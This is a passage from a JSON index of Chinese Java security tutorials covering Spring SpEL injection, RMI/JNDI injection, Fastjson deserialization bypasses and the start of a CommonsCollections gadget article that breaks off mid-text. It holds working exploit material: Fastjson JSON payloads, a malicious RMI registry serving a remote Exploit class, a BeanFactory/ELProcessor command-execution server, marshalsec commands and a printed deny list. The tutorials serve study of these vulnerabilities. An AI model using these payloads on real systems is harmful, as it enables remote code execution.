(!this.isWritableProperty(propertyName)) {\n               throw new NotWritablePropertyException(this.type, propertyName);\n           } else {\n               StandardEvaluationContext context = new StandardEvaluationContext();\n               context.addPropertyAccessor(new MapDataBinder.MapPropertyAccessor.PropertyTraversingMapAccessor(this.type, this.conversionService));\n               context.setTypeConverter(new StandardTypeConverter(this.conversionService));\n               context.setRootObject(this.map);\n               Expression expression = PARSER.parseExpression(propertyName);\n               PropertyPath leafProperty = this.getPropertyPath(propertyName).getLeafProperty();\n               TypeInformation<?> owningType = leafProperty.getOwningType();\n               TypeInformation<?> propertyType = leafProperty.getTypeInformation();\n               propertyType = propertyName.endsWith(\"]\") ? propertyType.getActualType() : propertyType;\n               if (propertyType != null && this.conversionRequired(value, propertyType.getType())) {\n                   PropertyDescriptor descriptor = BeanUtils.getPropertyDescriptor(owningType.getType(), leafProperty.getSegment());\n                   if (descriptor == null) {\n                       throw new IllegalStateException(String.format(\"Couldn't find PropertyDescriptor for %s on %s!\", leafProperty.getSegment(), owningType.getType()));\n                   }\n                   MethodParameter methodParameter = new MethodParameter(descriptor.getReadMethod(), -1);\n                   TypeDescriptor typeDescriptor = TypeDescriptor.nested(methodParameter, 0);\n                   if (typeDescriptor == null) {\n                       throw new IllegalStateException(String.format(\"Couldn't obtain type descriptor for method parameter %s!\", methodParameter));\n                   }\n                   value = this.conversionService.convert(value, TypeDescriptor.forObject(value), typeDescriptor);\n               }\n               expression.setValue(context, value);\n           }\n       }\n```\n\n**开发者使用如下代码：**\n\n```java\n@RequestMapping(method = RequestMethod.POST)\npublic Object register(UserForm userForm, BindingResult binding, Model model) {\n \n        userForm.validate(binding, userManagement);\n        if (binding.hasErrors()) {\n            return \"users\";\n        }\n \n        userManagement.register(new Username(userForm.getUsername()), Password.raw(userForm.getPassword()));\n \n        RedirectView redirectView = new RedirectView(\"redirect:/users\");\n        redirectView.setPropagateQueryParams(true);\n \n        return redirectView;\n   }\n```\n\n其流程简单上说就是在获取POST过来的参数时候因为要自动绑定进入实体类，所以首先要通过 `isWritableProperty` 中调用的 `getPropertyPath` 来判断参数名。如:传来的username参数是否是开发者controller中接收的 `UserForm` 实体类里的一个属性名。然后把用户传入的参数key即 `propertyName` 进行 `PARSER.parseExpression(propertyName)` ，最后 `setValue(context,value)` 触发了恶意代码。\n\n# 防御方式\n\n因为SpEL表达式注入漏洞导致攻击者可以通过表达式执行精心构造的任意代码，导致命令执行。为了防御该类漏洞，Spring官方推出了 `SimpleEvaluationContext` 作为安全类来防御该类漏洞。\n\n\n\n**参考：**\n\nhttps://www.codercto.com/a/55517.html\n\nhttps://www.freebuf.com/vuls/197008.html\n\nhttps://www.jianshu.com/p/ce4ac733a4b9","tags":["JAVA","SPEL"],"categories":["JAVA安全教程"]},{"title":"JAVA RMI和JDNI简介","url":"/2019/03/16/JAVA-RMI和JDNI简介/","content":"# 什么是RMI和JNDI\n\nJava RMI（Java Remote Method Invocation），即Java远程方法调用。是Java编程语言里，一种用于实现远程过程调用的应用程序**编程接口**。RMI 使用 **JRMP（Java Remote Message Protocol，Java远程消息交换协议**）实现，使得客户端运行的程序可以调用远程服务器上的对象。是实现RPC的一种方式。\n\nJava Naming and Directory Interface (JDNI)名为 Java命名和目录接口，，简单来说就是 JNDI 提供了**一组通用的接口**可供应用很方便地去访问不同的后端服务，例如 LDAP、RMI、CORBA 等。\n\nJNDA和RMI的关系可以粗浅的理解为url和http的关系：\n\n- JNDI：类比url，提供访问的地址\n\n- RMI：类比http，是url中使用的协议。\n\n# RMI 的使用\n\n1、server端：创建远程对象，并注册远程对象\n\n```java\n//定义远程对象的接口\npublic interface HelloService extends Remote {\n    String say() throws RemoteException;\n}\n\n//接口的实现\npublic class HelloServiceImpl extends UnicastRemoteObject implements HelloService {\n    public HelloServiceImpl() throws RemoteException{\n        super();\n    }\n\n    @Override\n    public String say() throws RemoteException {\n        return \"Hello\";\n    }\n}\n\n//注册远程对象\npublic class Service {\n    public static void main(String[] args) throws RemoteException, AlreadyBoundException, MalformedURLException {\n        HelloServiceImpl helloService = new HelloServiceImpl();\n        LocateRegistry.createRegistry(1099);\n        Naming.bind(\"rmi://127.0.0.1/hello\",helloService);\n    }\n}\n```\n\n2、client端：查找远程对象，调用远程方法\n\n```java\npublic class Client {\n    public static void main(String[] args) throws RemoteException, NotBoundException, MalformedURLException {\n        HelloService helloService = (HelloService) Naming.lookup(\"rmi://127.0.0.1/hello\");\n        System.out.println(helloService.say());\n    }\n}\n```\n\n# RMI 的原理\n\nRMI本质是TCP网络通信，内部封装了序列化和通信过程，使用代理实现接口调用。\n\n**几个重要知识点：**\n\n1. RMI的传输是基于反序列化的。\n2. 对于任何一个以对象为参数的RMI接口，你都可以发一个自己构建的对象，迫使服务器端将这个对象按任何一个存在于服务端classpath（不在classpath的情况，可以看后面RMI动态加载类相关部分）中的可序列化类来反序列化恢复对象。\n\n### 调用过程\n\n![image-20200216203005799](/images/a9/1.png)\n\n1. Server端监听一个端口，这个端口是JVM随机选择的；\n2. Client端并不知道Server远程对象的通信地址和端口，但是Stub中包含了这些信息，并封装了底层网络操作；\n3. Client端可以调用Stub上的方法；\n4. Stub连接到Server端监听的通信端口并提交参数；\n5. 远程Server端上执行具体的方法，并返回结果给Stub；\n6. Stub返回执行结果给Client端，从Client看来就好像是Stub在本地执行了这个方法一样；\n\n### 获取Stub\n\n假设Stub可以通过调用某个远程服务上的方法向远程服务来获取，但是调用远程方法又必须先有远程对象的Stub，所以这里有个死循环问题。JDK提供了一个RMI注册表（RMIRegistry）来解决这个问题。RMIRegistry也是一个远程对象，默认监听在传说中的**1099端口**上，可以使用代码启动RMIRegistry，也可以使用rmiregistry命令。\n\n![img](/images/a9/2.png)\n\n所以从客户端角度看，服务端应用是有两个端口的，**一个是RMI Registry端口（默认为1099），另一个是远程对象的通信端口（随机分配的）**，通常我们只需要知道Registry的端口就行了，Server的端口包含在了Stub中。RMI Registry可以和Server端在一台服务器上，也可以在另一台服务器上，不过大多数时候在同一台服务器上且运行在同一JVM环境下。\n\n# 动态加载类\n\nRMI核心特点之一就是动态类加载，如果当前JVM中没有某个类的定义，它可以从远程URL去下载这个类的class，动态加载的对象class文件可以使用Web服务的方式进行托管。这可以动态的扩展远程应用的功能，RMI注册表上可以动态的加载绑定多个RMI应用。对于客户端而言，服务端返回值也可能是一些子类的对象实例，而客户端并没有这些子类的class文件，如果需要客户端正确调用这些子类中被重写的方法，则同样需要有运行时动态加载额外类的能力。客户端使用了与RMI注册表相同的机制。RMI服务端将URL传递给客户端，客户端通过HTTP请求下载这些类。\n\n![动态加载类](/images/a9/3.png)\n\n# Weblogic RMI\n\nT3传输协议是WebLogic的自有协议，Weblogic RMI就是通过T3协议传输的（可以理解为序列化的数据载体是T3），它有如下特点：\n\n1. 服务端可以持续追踪监控客户端是否存活（心跳机制），通常心跳的间隔为60秒，服务端在超过240秒未收到心跳即判定与客户端的连接丢失。\n2. 通过建立一次连接可以将全部数据包传输完成，优化了数据包大小和网络消耗。\n\n上面说了JAVA RMI是使用JRMP的协议进行传输，**协议的不同就是他们最大的差别。**\n\n# RMI的攻击一般流程\n\n1. 服务端打开了RMI Registry端口（默认1099）\n2. 创建恶意客户端代码，连接RMI Registry，获取远程恶意对象，并调用恶意对象，执行恶意操作\n\n备注：\n\n- 执行的恶意操作是在服务端执行的，因为RMI就是为了在客户端一样方便的执行远程服务端。并且如果执行的是客户端的恶意操作，那本就不是漏洞\n- 远程恶意对象，是服务器刚好存在，并且我们知道。\n- 通常RMI Registry和服务端在同一服务器且处于同一JVM下，所以可以利用服务器的组件CommonsCollections来构造gadget，构造方法就是前面文章介绍的反序列gadget构造方法。\n\n# RMI小结\n\n1. RMI标准实现是Java RMI，其他实现还有Weblogic RMI、Spring RMI等。\n2. RMI的调用是基于序列化的，**一个对象远程传输需要序列化**，需要使用到这个对象就需要从序列化的数据中恢复这个对象，恢复这个对象时对应的readObject、readExternal等方法会被自动调用。\n3. RMI可以利用服务器本地反序列化利用链进行攻击。\n4. RMI具有动态加载类的能力以及能利用这种能力进行恶意利用。这种利用方式是在本地不存在可用的利用链或者可用的利用链中某些类被过滤了导致无法利用时可以使用，不过利用条件有些苛刻。\n5. 讲了Weblogic RMI和Java RMI的区别，以及Java RMI默认使用的专有传输协议（或者也可以叫做默认协议）是JRMP，Weblogic RMI默认使用的传输协议是T3。\n6. Weblogic RMI正常调用触发反序列化以及模拟T3协议触发反序列化都可以，但是模拟T3协议传输简化了很多过程。\n\n# JNDI的使用\n\nJNDI自身并不区分客户端和服务器端，也不具备远程能力，但是被其协同的一些其他应用一般都具备远程能力，JNDI在客户端和服务器端都能够进行一些工作，客户端上主要是进行各种访问，查询，搜索，而服务器端主要进行的是帮助管理配置。\n\n前面说了JNDI类似于url，rmi类似于http，所以JNDI还可以使用除rmi之外的协议，例如LDAP、CORBA等。\n\n##JNDI与RMI配合使用\n\n```java\nHashtable env = new Hashtable();\nenv.put(Context.INITIAL_CONTEXT_FACTORY,\n        \"com.sun.jndi.rmi.registry.RegistryContextFactory\");\nenv.put(Context.PROVIDER_URL,\n        \"rmi://localhost:9999\");\nContext ctx = new InitialContext(env);\n\n//将名称refObj与一个对象绑定，这里底层也是调用的rmi的registry去绑定\nctx.bind(\"refObj\", new RefObject());\n\n//通过名称查找对象\nctx.lookup(\"refObj\");\n```\n\n## JNDI与LDAP配合使用\n\n```java\nHashtable env = new Hashtable();\nenv.put(Context.INITIAL_CONTEXT_FACTORY,\n \"com.sun.jndi.ldap.LdapCtxFactory\");\nenv.put(Context.PROVIDER_URL, \"ldap://localhost:1389\");\n\nDirContext ctx = new InitialDirContext(env);\n\n//通过名称查找远程对象，假设远程服务器已经将一个远程对象与名称cn=foo,dc=test,dc=org绑定了\nObject local_obj = ctx.lookup(\"cn=foo,dc=test,dc=org\");\n```\n\n# JNDI动态协议转换\n\n上面的两个例子都手动设置了对应服务的工厂以及对应服务的PROVIDER_URL，但是JNDI是能够进行动态协议转换的。\n\n例如：\n\n```java\nContext ctx = new InitialContext();\nctx.lookup(\"rmi://attacker-server/refObj\");\n//ctx.lookup(\"ldap://attacker-server/cn=bar,dc=test,dc=org\");\n//ctx.lookup(\"iiop://attacker-server/bar\");\n```\n\n上面没有设置对应服务的工厂以及PROVIDER_URL，JNDI根据**传递的URL协议**自动转换与设置了对应的工厂与PROVIDER_URL（即使服务端提前设置了工厂与PROVIDER_URL）。\n\n在使用lookup方法时，会进入getURLOrDefaultInitCtx这个方法，转换就在这里面：\n\n```java\npublic Object lookup(String name) throws NamingException {\n    return getURLOrDefaultInitCtx(name).lookup(name);\n}\n\nprotected Context getURLOrDefaultInitCtx(String name) \nthrows NamingException {\nif (NamingManager.hasInitialContextFactoryBuilder()) {//这里不是说我们设置了上下文环境变量就会进入，因为我们没有执行初始化上下文工厂的构建，所以上面那两种情况在这里都不会进入\n    return getDefaultInitCtx();\n}\nString scheme = getURLScheme(name);//尝试从名称解析URL中的协议\nif (scheme != null) {\n    Context ctx = NamingManager.getURLContext(scheme, myProps);//如果解析出了Schema协议，则尝试获取其对应的上下文环境\n    if (ctx != null) {\n   return ctx;\n    }\n}\nreturn getDefaultInitCtx();\n   }\n```\n\n# JNDI漏洞原理\n\nJNDI接口在初始化时，可以将RMI URL作为参数传入，而JNDI注入就出现在客户端的lookup()函数中，如果lookup()的参数可控就可能被攻击。\n\n备注：\n\n- InitialContext 是一个实现了 Context接口的类。使用这个类作为JNDI命名服务的入口点。创建InitialContext 对象需要传入一组属性，参数类型为java.util.Hashtable或其子类之一。\n- 需要重点注意的是，JNDI注入恶意的RMI服务器是攻击者在本地可控，**被攻击的服务器看成是发起lookup请求的客户端。**\n\n上一章节讲了RMI的漏洞利用，恶意代码是在RMI服务端执行的。所以为什么目标服务器lookup(RMI客户端)一个恶意的RMI服务地址，恶意代码会在目标服务器（RMI客户端）执行呢？\n\n## 利用JNDI References进行注入\n\n在JNDI服务中，RMI服务端除了直接绑定远程对象之外，还可以**通过References类来绑定一个外部的远程对象**（当前名称目录系统之外的对象）。绑定了Reference之后，服务端会先通过Referenceable.getReference()获取绑定对象的引用，并且在目录中保存。当客户端在lookup()查找这个远程对象时，客户端会获取相应的object factory，最终通过factory类将reference转换为具体的对象实例。\n\n使用工厂的话，因为为了构造对象，需要先从远程获取工厂类，**并在目标系统中工厂类被加载**。\n\n**整个利用流程如下：**\n\n1. 目标代码中调用了InitialContext.lookup(URI)，且URI为用户可控；\n2. 攻击者控制URI参数为恶意的RMI服务地址，如：rmi://hacker_rmi_server//name；\n3. 攻击者RMI服务器向目标返回一个Reference对象，Reference对象中指定某个精心构造的Factory类；\n4. 目标在进行lookup()操作时，会动态加载并实例化Factory类，接着调用factory.getObjectInstance()获取外部远程对象实例。\n\n## 攻击向量\n\n攻击者的服务端需要启动一个RMI Registry，并且绑定一个Reference远程对象，同时设置一个恶意的factory类。\n\n```java\n    Registry registry = LocateRegistry.createRegistry(1099);\n    String remote_class_server = \"http://192.168.1.200:8080/\";\n    Reference reference = new Reference(\"Exploit\", \"Exploit\", remote_class_server);\n    //reference的factory class参数指向了一个外部Web服务的地址\n    ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);\n    registry.bind(\"xxx\", referenceWrapper);\n```\n\n同时启动一个WebServer提供Exploit.class下载。恶意代码可以放在构造方法中，也可以放在getObjectInstance(）方法中：\n\n```java\npublic class Exploit implements ObjectFactory {\n\n    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) {\n        exec(\"xterm\");\n        return null;\n    }\n\n    public static String exec(String cmd) {\n        try {\n            String sb = \"\";\n            BufferedInputStream in = new BufferedInputStream(Runtime.getRuntime().exec(cmd).getInputStream());\n            BufferedReader inBr = new BufferedReader(new InputStreamReader(in));\n            String lineStr;\n            while ((lineStr = inBr.readLine()) != null)\n                sb += lineStr + \"\\n\";\n            inBr.close();\n            in.close();\n            return sb;\n        } catch (Exception e) {\n            return \"\";\n        }\n    }\n}\n```\n\n**参考：**\n\nhttps://www.anquanke.com/post/id/194384#h3-2\n\nhttps://www.jianshu.com/p/5c6f2b6d458a\n\nhttps://www.freebuf.com/column/189835.html","tags":["JDNI","RMI","反序列化"],"categories":["JAVA安全教程"]},{"title":"Fastjson历史漏洞绕过分析","url":"/2019/02/18/Fastjson历史漏洞绕过分析/","content":"\n# 前言\n\n本文转载自https://www.anquanke.com/post/id/182140#h2-1, 这里也非常好的总结了fastjson历史的绕过漏洞，基本上就是对checkAutoType函数的绕过。\n\npom文件引用fastjson语法：\n\n```xml\n<!-- https://mvnrepository.com/artifact/com.alibaba/fastjson -->\n<dependency>\n    <groupId>com.alibaba</groupId>\n    <artifactId>fastjson</artifactId>\n    <version>1.2.41</version>\n</dependency>\n```\n\n使用样例：\n\n```java\nimport com.alibaba.fastjson.JSON;\n \npublic class newPoc {\n    public static void main(String[] argv) {\n        String payload = \"{\\\"name\\\":{\\\"@type\\\":\\\"java.lang.Class\\\",\\\"val\\\":\\\"com.sun.rowset.JdbcRowSetImpl\\\"},\\\"x\\\":{\\\"@type\\\":\\\"com.sun.rowset.JdbcRowSetImpl\\\",\\\"dataSourceName\\\":\\\"rmi://127.0.0.1/Exploit\\\",\\\"autoCommit\\\":true}}\";\n        JSON.parse(payload);\n    }\n}\n```\n\n\n\n#Fastjson RCE关键函数\n\n**DefaultJSONParser. parseObject()** 解析传入的json字符串提取不同的key进行后续的处理\n\n**TypeUtils. loadClass()**  根据传入的类名，生成类的实例\n\n**JavaBeanDeserializer. Deserialze()** 依次调用@type中传入类的对象公有set\\get\\is方法。\n\n**ParserConfig. checkAutoType()** 阿里后续添加的防护函数，用于在loadclass前检查传入的类是否合法。\n\n # 历史fastjson漏洞汇总与简析\n\n## fastjson RCE漏洞的源头\n\n首先来看一次fastjson反序列化漏洞的poc\n\n```java\n{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:1099/Exploit\",\" \"autoCommit\":true}\n```\n\n先看调用栈\n\n```\nExec:620, Runtime  //命令执行\n\n…\n\nLookup:417, InitalContext   /jndi lookup函数通过rmi或者ldap获取恶意类\n\n…\n\nsetAutoCommit:4067, JdbcRowSetImpl 通过setAutoCommit从而在后面触发了lookup函数\n\n…\n\nsetValue:96, FieldDeserializer //反射调用传入类的set函数\n\n…\n\ndeserialze:600,  JavaBeanDeserializer 通过循环调用传入类的共有set,get,is函数\n\n…\n\nparseObject:368, DefaultJSONParser 解析传入的json字符串\n\n…\n```\n\n第一版的利用原理比较清晰，因为fastjson在处理以**@type形式传入的类的时候，会默认调用该类的共有set\\get\\is函数**，因此我们在寻找利用类的时候思路如下：\n\n1. 类的成员变量我们可以控制\n2. 想办法在调用类的某个set\\get\\is函数的时候造成命令执行\n\n于是便找到了JdbcRowSetImpl类，该类在setAutoCommit函数中会对成员变量dataSourceName进行lookup，完美的jndi注入利用。\n\n关于jndi注入的利用方式我在这里简单提一下，因为jndi注入的利用受jdk版本影响较大，所以在利用的时候还是要多尝试的。\n\n注：利用之前当然要先确定一下漏洞是否存在，通过dnslog是个比较好用的法子。\n\n**基于rmi的利用方式：**\n\n**适用jdk版本：**JDK 6u132, JDK 7u122, JDK 8u113之前\n\n利用方式：\n\n```\njava -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalc.jndi.RMIRefServer\n\nhttp://127.0.0.1:8080/test/#Expolit\n```\n\n **基于ldap的利用方式：**\n\n**适用jdk版本：**JDK 11.0.1、8u191、7u201、6u211之前\n\n利用方式：\n\n```\njava -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalc.jndi.LDAPRefServer\n\nhttp://127.0.0.1:8080/test/#Expolit\n```\n\n**基于BeanFactory的利用方式：**\n\n**适用jdk版本：**JDK 11.0.1、8u191、7u201、6u211以后\n\n利用前提：因为这个利用方式需要借助服务器本地的类，而这个类在tomcat的jar包里面，一般情况下只能在tomcat上可以利用成功。\n\n利用方式：\n\n```java\npublic class EvilRMIServerNew {\n    public static void main(String[] args) throws Exception {\n        System.out.println(\"Creating evil RMI registry on port 1097\");\n        Registry registry = LocateRegistry.createRegistry(1097);\n\n        //prepare payload that exploits unsafe reflection in org.apache.naming.factory.BeanFactory\n        ResourceRef ref = new ResourceRef(\"javax.el.ELProcessor\", null, \"\", \"\", true,\"org.apache.naming.factory.BeanFactory\",null);\n\n        //redefine a setter name for the 'x' property from 'setX' to 'eval', see BeanFactory.getObjectInstance code\n        ref.add(new StringRefAddr(\"forceString\", \"x=eval\"));\n\n        //expression language to execute 'nslookup jndi.s.artsploit.com', modify /bin/sh to cmd.exe if you target windows\n        ref.add(new StringRefAddr(\"x\", \"\\\"\\\".getClass().forName(\\\"javax.script.ScriptEngineManager\\\").newInstance().getEngineByName(\\\"JavaScript\\\").eval(\\\"new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/sh','-c','open /Applications/Calculator.app/']).start()\\\")\"));\n        \n        ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(ref);\n\n        registry.bind(\"Object\", referenceWrapper);\n    }\n}\n```\n\n## fastjson RCE漏洞的历次修复与绕过\n\nfastjson在曝出第一版的RCE漏洞之后，官方立马做了更新，于是就迎来了一个新的主角，checkAutoType()，**在接下来的一系列绕过中都是和这个函数的斗智斗勇**。\n\n先看一下这个函数的代码\n\n```java\npublic Class<?> checkAutoType(String typeName, Class<?> expectClass, int features) {\n    if (typeName == null) {\n        return null;\n    } else if (typeName.length() >= 128) {\n        throw new JSONException(\"autoType is not support. \" + typeName);\n    } else {\n        String className = typeName.replace('$', '.');\n        Class<?> clazz = null;\n        int mask;\n        String accept;\n        if (this.autoTypeSupport || expectClass != null) {\n            for(mask = 0; mask < this.acceptList.length; ++mask) {\n                accept = this.acceptList[mask];\n                if (className.startsWith(accept)) {\n                    clazz = TypeUtils.loadClass(typeName, this.defaultClassLoader, false);\n                    if (clazz != null) {\n                        return clazz;\n                    }\n                }\n            }\n\n            for(mask = 0; mask < this.denyList.length; ++mask) {\n                accept = this.denyList[mask];\n                if (className.startsWith(accept) && TypeUtils.getClassFromMapping(typeName) == null) {\n                    throw new JSONException(\"autoType is not support. \" + typeName);\n                }\n            }\n        }\n```\n\n防御的方式比较清晰，限制长度+黑名单，这个时候第一时间产生的想法自然是绕过黑名单，先看一下第一版的黑名单：\n\n```java\nthis.denyList = \"bsh,com.mchange,com.sun.,java.lang.Thread,java.net.Socket,java.rmi,javax.xml,org.apache.bcel,org.apache.commons.beanutils,org.apache.commons.collections.Transformer,org.apache.commons.collections.functors,org.apache.commons.collections4.comparators,org.apache.commons.fileupload,org.apache.myfaces.context.servlet,org.apache.tomcat,org.apache.wicket.util,org.apache.xalan,org.codehaus.groovy.runtime,org.hibernate,org.jboss,org.mozilla.javascript,org.python.core,org.springframework\".split(\",\");\n```\n\n其实第一版的黑名单还是挺强大的，关于黑名单的绕过，就我已知的目前只有一个依赖于ibatis的payload，当然因为ibatis在java里面的使用还是非常广泛的，所以这个payload危害也是比较大的，这也就是1.2.45的绕过。\n\n```json\n{\"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",\"properties\":{\"data_source\":\"rmi://localhost:1099/Exploit\"}}\n```\n\n绕过黑名单是第一种思路，但是安全界大牛们思路还是比较灵活的，很快又发现了第二种思路，我们再仔细看一下checkAutoType函数的下面这几行代码：\n\n```java\nf (!this.autoTypeSupport) {\n    for(mask = 0; mask < this.denyList.length; ++mask) {\n        accept = this.denyList[mask];\n        if (className.startsWith(accept)) {\n            throw new JSONException(\"autoType is not support. \" + typeName);\n        }\n    }\n\n    for(mask = 0; mask < this.acceptList.length; ++mask) {\n        accept = this.acceptList[mask];\n        if (className.startsWith(accept)) {\n            if (clazz == null) {\n                clazz = TypeUtils.loadClass(typeName, this.defaultClassLoader, false);\n            }\n```\n\n该函数是先检查传入的@type的值是否是在黑名单里，然后再进入loadClass函数，这样的话如果loadClass函数里要是会对传入的class做一些处理的话，我们是不是就能绕过黑名单呢，跟进loadClass函数，\n\n```java\npublic static Class<?> loadClass(String className, ClassLoader classLoader, boolean cache) {\n    if (className != null && className.length() != 0) {\n        Class<?> clazz = (Class)mappings.get(className);\n        if (clazz != null) {\n            return clazz;\n        } else if (className.charAt(0) == '[') {\n            Class<?> componentType = loadClass(className.substring(1), classLoader);\n            return Array.newInstance(componentType, 0).getClass();\n        } else if (className.startsWith(\"L\") && className.endsWith(\";\")) {\n            String newClassName = className.substring(1, className.length() - 1);\n            return loadClass(newClassName, classLoader);\n```\n\n可以看到当传入的className以L开头以 ; 结尾的时候会把className的首字符和最后一个字符截去，再去生成实例，于是绕过的poc就非常好写了，原来的payload的利用类的首尾加上这两个字符就Ok了\n\n```json\n{\"@type\":\"Lcom.sun.rowset.RowSetImpl;\",\"dataSourceName\":\"rmi://localhost:1099/Exploit\",\"autoCommit\":true}\n```\n\n之后的42、43版本的绕过和41的原理是一样的我们就不再提了，具体可以去https://github.com/shengqi158/fastjson-remote-code-execute-poc/自行查阅。\n\n## 最新fastjson RCE的分析\n\nOK，现在来到了我们期待已久的最新的fastjson漏洞的分析，关于这个漏洞有很精彩的小故事可以讲一讲。\n\n这个漏洞在曝光之后poc迟迟未见，关于它能够被利用成功的版本也可谓是每日都有更新，关于版本有几个关键字 “51”、“48”，“58”，究竟是哪个让人摸不到头脑，于是乎，决定先去看看官方的公告，发现只有49版本releases的公告里面写了“增强安全防护”，于是乎决定去48、49版本寻觅一下，看看commit之类的，但是当时也没有发现什么。\n\n这个时候，一个名不愿透露姓名的大佬在某个技术群里面默默发了一个关键字“testcase“，当时忽然间产生了一丝电流，难道阿里的大佬们在修漏洞的时候会在testcase里面做测试，然后还把testcase的代码传到git里面了？但是还不够，因为testcase的代码太多了究竟放在哪里呢，这个时候之前的分析就可以知道，阿里在防护第一版RCE的时候是通过autotypecheck函数，那这次的补丁也很有可能和它相关喽，直接在testcase里面全局寻找带有autotype关键字的文件名，于是乎，就到达了如下位置\n\n![img](/images/a8/1.png)\n\n依次去看一下里面的文件，基本都是和反序列化漏洞相关的test，其中AutoTypeTest4.java文件中有如下代码：\n\n```java\n       String payload=\"{\\\"@type\\\":\\\"java.lang.Class\\\",\\\"val\\\":\\\"com.sun.rowset.JdbcRowSetImpl\\\"}\";\n \t\n        String payload_2 = \"{\\\"@type\\\":\\\"com.sun.rowset.JdbcRowSetImpl\\\",\\\"dataSourceName\\\":\\\"rmi://127.0.0.1:8889/xxx\\\",\\\"autoCommit\\\":true}\";\n \t\n        assertNotNull(\"class deser is not null\", config.getDeserializer(Class.class));\n        int size = mappings.size();\n        final int COUNT = 10;\n        for (int i = 0; i < COUNT; ++i){\n            JSON.parse(payload, config);\n        }\n\n        for (int i = 0; i < COUNT; ++i){ \t\n            Throwable error2 = null;\n            try {\n                JSON.parseObject(payload_2);\n            } catch (Exception e) {\n                error2 = e;\n            }\n            assertNotNull(error2); \t\n            assertEquals(JSONException.class, error2.getClass());\n        }\n        assertEquals(size, mappings.size());\n    }\n```\n\n看上去和以往的payload都不太一样，先去写一个简化版的代码，调试一下\n\n```java\nString payload=\"{\\\"@type\\\":\\\"java.lang.Class\\\",\\\"val\\\":\\\"com.sun.rowset.JdbcRowSetImpl\\\"}\";\n\nString payload_2 = \"{\\\"@type\\\":\\\"com.sun.rowset.JdbcRowSetImpl\\\",\\\"dataSourceName\\\":\\\"ldap://127.0.0.1:1389/Exploit\\\",\\\"autoCommit\\\":true}\";\n\nJSON.parse(payload);\nJSON.parse(payload_2);\n```\n\n发现可以弹框成功（从49版本往前，一个版本一个版本试验，到47版本试验成功了），那这就很可疑了，但是还有个问题，漏洞要利用总不能让你同时穿进去两个json字符串让你依次parse吧，于是把两串json整理如下\n\n```json\n{\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://localhost:1389/Exploit\",\"autoCommit\":true}}}\n```\n\n果然可以利用成功，、接下来可以调试一下看看漏洞成因，因为一眼就能看出来是绕过了黑名单，所以问题的关键自然在checkAutoType()和loadClass()这两个函数中，去跟进一下\n\n首先在”a”:{“@type”:”java.lang.Class”,”val”:”com.sun.rowset.JdbcRowSetImpl”}传入的时候，Class类是不在黑名单内的，在MiscCodec类的deserialze函数里面可以看到会将val的值拿出来用来生成对应的对象，即JdbcRowSetImpl，但是我们并没法给JdbcRowSetImpl对象的成员变量赋值，\n\n![img](/images/a8/2.png)\n\n继续往deserialze的下面看，当传入的@type的值为Class的时候会调用loadClass函数，\n\n![img](/images/a8/3.png)\n\n再往下跟，有调了一下loadClass函数，多加了一个值为true的参数\n\n![img](/images/a8/4.png)\n\n再跟进去可以看到因为传入的cache为true，所以会在mapping里面把JdbcRowSetImpl这个对象的实例和com.sun.rowset.JdbcRowSetImpl对应起来，OK现在关于a的分析到此为止，\n\n![img](/images/a8/5.png)\n\n我们该去跟着b\n\n```json\n（”b”:{“@type”:”com.sun.rowset.JdbcRowSetImpl”,”dataSourceName”:”ldap://localhost:1389/Exploit”,”autoCommit”:true}}）\n```\n\n了，看看为什么checkautotype()函数没把b给拦下来，直接去跟进checkautotype函数，当autotype为true的时候，虽然发现黑名单匹配了，但是TypeUtils.getClassFromMapping(typeName) ！= null所以不会抛出异常。\n\n![img](/images/a8/6.png)\n\n而当autotype为false的时候，发现当传入的@type对应的类在mapping里面有的时候，就直接把之前生成的对象拉出来了，这时候直接返回，压根还没有走到后面的黑名单，所以成功绕过了之前的补丁。可以看到这次的poc是不受autotype影响的，\n\n![img](/images/a8/7.png)\n\n从上面的分析也可以明白后续官方的补丁做了什么，那自然是把cache的默认值改成了false，不让Class生成的对象存在mapping里面了。\n\n**备注：**\n\n最新的RCE漏洞https://xz.aliyun.com/t/5680这里讲的更清楚。原理：\n\n当发送第一次请求时，Class是通过deserializers.findClass加载的，然后Class将JdbcRowSetImpl类加载进map中，然后第二次请求时，就这里就成功找到了JdbcRowSetImpl类，从而绕过检测。\n\n# Fastjson漏洞挖掘的规律总结\n\n从上面追溯的fastjson的修复绕过上面可以看到有以下几点还是很值得注意的：\n\n1. fastjson的防范类是checkAutoType函数，而导致命令执行的很关键的一步是loadClass，因此从checkAutoType到loadClass之间的代码，将会是绕过需要研究的关键部分。\n2. 如果需要绕过黑名单，需要将目光放到使用量较大，并提供jndi功能的jar包上。\n3. 对于这种早就修复但是还没有公开的漏洞，github的源码中说不定有惊喜。\n\n\n\n**参考：**\n\nhttps://mp.weixin.qq.com/s/Dq1CPbUDLKH2IN0NA_nBDA\n\nhttps://github.com/shengqi158/fastjson-remote-code-execute-poc/\n\nhttps://github.com/mbechler/marshalsec","tags":["反序列化","Fastjson"],"categories":["JAVA安全教程"]},{"title":"CommonsCollections反序列化gadget构造","url":"/2019/02/16/CommonsCollections反序列化gadget构造/","content":"\n# 前言\n\n文章 https://www.freebuf.com/articles/web/214096.html 已经把几种利用方式总结的很好了，没必要再重复造轮子，就转载过来。里面的代码大家最好自己idea里调试一遍，有助于理解。文章中最后的总结是构造payload的精华总结，希望大家能好好看下总结和理解。\n\n# Apache Commons Collections 简介\n\nApache Commons Collections是一个扩展了Java标准库里的Collection结构的第三方基础库，它提供了很多强有力的数据结构类型并且实现了各种集合工具类。作为Apache开源项目的重要组件，Commons 